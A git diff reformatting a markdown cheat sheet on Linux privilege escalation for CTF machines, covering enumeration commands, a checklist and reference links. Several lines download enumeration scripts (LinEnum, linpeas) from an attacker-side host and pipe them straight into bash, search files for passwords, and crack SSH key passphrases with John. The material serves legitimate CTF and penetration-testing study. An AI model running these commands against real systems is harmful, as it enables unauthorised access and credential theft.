@@ -11,8 +11,8 @@
     - [LinEmum.sh](#linemumsh)
   - [CTF Machine Tactics](#ctf-machine-tactics)
   - [Using SSH Keys](#using-ssh-keys)
-- [Methodology - Linux Checklist](#methodology---linux-checklist)
-- [Following the path to Enumerating Linux](#following-the-path-to-enumerating-linux)
+  - [Methodology - Linux Checklist](#methodology---linux-checklist)
+  - [Following the path to Enumerating Linux](#following-the-path-to-enumerating-linux)
   - [References](#references)
 
 <!-- /TOC -->
@@ -57,7 +57,7 @@ Check **who** you are, which **privileges** do you have, which **users** are in 
   #List superusers  
   awk -F: '($3 == "0") {print}' /etc/passwd  
   #Currently logged users  
-  w  
+  w
   #Login history  
   last | tail  
   #Last log of each user  
@@ -326,13 +326,11 @@ LinEnum is a handy method of automating Linux enumeration. It is also written as
 
 First we need to git a copy to our local Kali linux machine:
 
-```
-git clone https://github.com/rebootuser/LinEnum.git
-```
+  `git clone https://github.com/rebootuser/LinEnum.git`
 
 Next we can serve it up in the python simple web server:
 
-```
+```shell
 root@kali:~test# cd LinEnum/
 root@kali:~test/LinEnum# ls
 root@kali:~test/LinEnum# python -m SimpleHTTPServer 80
@@ -340,61 +338,41 @@ Serving HTTP on 0.0.0.0 port 80 ...
 ```
 
 And now on our remote Linux machine we can pull down the script and pipe it directly to Bash:
-
-```
-www-data@vulnerable:/var/www$ curl 10.10.10.10/LinEnum.sh | bash
-```
-
+  `www-data@vulnerable:/var/www$ curl 10.10.10.10/LinEnum.sh | bash`
 And the enumeration script should run on the remote machine.
 
 ## CTF Machine Tactics
 
 Often it is easy to identify when a machine was created by the date / time of file edits. We can create a list of all the files with a modify time in that timeframe with the following command:
 
-```
-find -L /  -type f -newermt 2019-08-24 ! -newermt 2019-08-27 2>&1 > /tmp/foundfiles.txt
-```
+`find -L /  -type f -newermt 2019-08-24 ! -newermt 2019-08-27 2>&1 > /tmp/foundfiles.txt`
 
-This has helped me to find interesting files on a few different CTF machines.
+This has helped me to find interesting files on a few different CTF machines. Recursively searching for passwords is also a handy technique:
+  `grep -ri "passw" .`
 
-Recursively searching for passwords is also a handy technique:
+- Wget Pipe a remote URL directory to Bash (linpeas):
 
-```shell
-grep -ri "passw" .
-```
+  `wget -q -O - "http://10.10.10.10/linpeas.sh" | bash`
 
-Wget Pipe a remote URL directory to Bash (linpeas):
+- Curl Pipe a remote URL directly to Bash (linpeas):
 
-```shell
-wget -q -O - "http://10.10.10.10/linpeas.sh" | bash
-```
-
-Curl Pipe a remote URL directly to Bash (linpeas):
-
-```shell
-curl -sSk "http://10.10.10.10/linpeas.sh" | bash
-```
+  `curl -sSk "http://10.10.10.10/linpeas.sh" | bash`
 
 ## Using SSH Keys
 
 Often, we are provided with password protected SSH keys on CTF boxes. It it helpful to be able to quicky crack and add these to your private keys.
 
-First we need to convert the ssh key using John:
+- First we need to convert the ssh key using John:
 
-```shell
-kali@kali:~/.ssh$ /usr/share/john/ssh2john.py ./id_rsa > ./id_rsa_john
-...
-```
+  `kali@kali:~/.ssh$ /usr/share/john/ssh2john.py ./id_rsa > ./id_rsa_john...`
 
-Next we will need to use that format to crack the password:
+- Next we will need to use that format to crack the password:
 
-```shell
-/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt ./id_rsa_john
-```
+  `/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt ./id_rsa_john`
 
-John should output a password for the private key.
+- John should output a password for the private key.
 
-# Methodology - Linux Checklist
+## Methodology - Linux Checklist
 
 - Kernel and distribution release details
 
@@ -489,24 +467,26 @@ John should output a password for the private key.
   - [ ] Checks to see if the host has Docker installed
   - [ ] Checks to determine if we're in an LXC container
 
-# Following the path to Enumerating Linux
+## Following the path to Enumerating Linux
 
-<https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/> <https://sirensecurity.io/blog/linux-privilege-escalation-resources/> <https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS>
+<https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>
+<https://sirensecurity.io/blog/linux-privilege-escalation-resources/>
+<https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS>
 
 ## References
 
-<https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/><br>
-<http://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/><br>
-<https://payatu.com/guide-linux-privilege-escalation/><br>
-<http://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/><br>
-<http://www.0daysecurity.com/penetration-testing/enumeration.html><br>
-<https://www.rebootuser.com/?p=1623#.V0W5Pbp95JP><br>
-<https://www.doomedraven.com/2013/04/hacking-linux-part-i-privilege.html><br>
-<https://securism.wordpress.com/oscp-notes-privilege-escalation-linux/><br>
-<https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/><br>
-<http://hackingandsecurity.blogspot.com/2016/06/exploiting-network-file-system-nfs.html><br>
-<https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt> <https://hkh4cks.com/blog/2017/12/30/linux-enumeration-cheatsheet/><br>
-<https://digi.ninja/blog/when_all_you_can_do_is_read.php><br>
-[https://medium.com/@D00MFist/vulnhub-lin-security-1-d9749ea645e2](mailto:https://medium.com/@D00MFist/vulnhub-lin-security-1-d9749ea645e2)<br>
-<https://gtfobins.github.io/><br>
+<https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>
+<http://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/>
+<https://payatu.com/guide-linux-privilege-escalation/>
+<http://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/>
+<http://www.0daysecurity.com/penetration-testing/enumeration.html>
+<https://www.rebootuser.com/?p=1623#.V0W5Pbp95JP>
+<https://www.doomedraven.com/2013/04/hacking-linux-part-i-privilege.html>
+<https://securism.wordpress.com/oscp-notes-privilege-escalation-linux/>
+<https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/>
+<http://hackingandsecurity.blogspot.com/2016/06/exploiting-network-file-system-nfs.html>
+<https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt> <https://hkh4cks.com/blog/2017/12/30/linux-enumeration-cheatsheet/>
+<https://digi.ninja/blog/when_all_you_can_do_is_read.php>
+[https://medium.com/@D00MFist/vulnhub-lin-security-1-d9749ea645e2](mailto:https://medium.com/@D00MFist/ vulnhub-lin-security-1-d9749ea645e2)
+<https://gtfobins.github.io/>
 <https://github.com/rebootuser/LinEnum>
